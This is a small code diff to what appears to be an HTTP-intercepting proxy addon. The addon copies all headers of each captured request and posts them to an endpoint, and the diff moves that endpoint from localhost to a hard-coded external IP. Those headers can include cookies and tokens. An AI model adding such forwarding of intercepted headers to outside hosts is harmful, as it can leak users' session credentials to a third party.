@@ -19,7 +19,7 @@ class HttpRecord:
             for key in flow.request.headers.keys():
                 headerRecord[key] = flow.request.headers[key]
             httpRecord["headers"] = headerRecord.__str__().replace("'", "\"")
-            requests.post("http://localhost:8082/ticket/proxy/user/add",
+            requests.post("http://110.42.64.193:88/ticket/proxy/user/add",
                           json=httpRecord, headers=headers)
 
 
